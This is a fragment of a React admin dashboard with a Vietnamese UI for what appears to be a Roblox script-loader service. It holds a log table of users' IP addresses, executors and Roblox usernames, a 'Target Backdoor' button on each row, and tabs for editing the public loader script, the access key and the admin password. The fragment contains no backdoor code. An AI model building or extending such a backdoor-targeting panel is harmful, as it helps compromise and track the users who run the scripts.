                    <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
                    <td className="p-3.5 text-gray-300">{log.executor}</td>
                    <td className="p-3.5 text-gray-400 text-[11px]">{new Date(log.created_at).toLocaleString('vi-VN')}</td>
                    <td className="p-3.5">
                      <button
                        onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
                        className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer"
                      >
                        <Zap className="w-3 h-3" /> Target Backdoor
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ==================== TAB 4: MAIN PAGE CUSTOMIZER ==================== */}
      {activeTab === 'custom_home' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
            <Sliders className="w-4 h-4" /> Cấu Hình Trang Chủ Public
          </div>
          <div className="space-y-4">
            <div>
              <label className="text-xs font-bold text-[#6E96FF] block mb-1">Loader Script Text Trang Chủ:</label>
              <textarea rows={2} value={loaderScript} onChange={(e) => setLoaderScript(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-gray-200" />
            </div>
            <div>
              <label className="text-xs font-bold text-[#6E96FF] block mb-1">Access Key Trang Chủ:</label>
              <input type="text" value={currentKey} onChange={(e) => setCurrentKey(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-[#6E96FF] font-extrabold" />
            </div>
          </div>
          <button onClick={handleSaveMainPageSettings} disabled={isSaving} className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs cursor-pointer">
            LƯU CẤU HÌNH TRANG CHÍNH
          </button>
        </div>
      )}

      {/* ==================== TAB 5: SETTINGS ==================== */}
      {activeTab === 'settings' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-4 shadow-xl max-w-xl">
          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
            <Settings className="w-4 h-4" /> Đổi Mật Khẩu Admin
          </div>
          <input type="password" placeholder="Mật khẩu mới..." value={newAdminPass} onChange={(e) => setNewAdminPass(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white" />
          <button onClick={handleSaveAdminPassword} className="w-full bg-green-600 font-black py-3 rounded-xl text-xs cursor-pointer">Lưu Mật Khẩu Mới</button>
        </div>
      )}

    </div>
  );
}
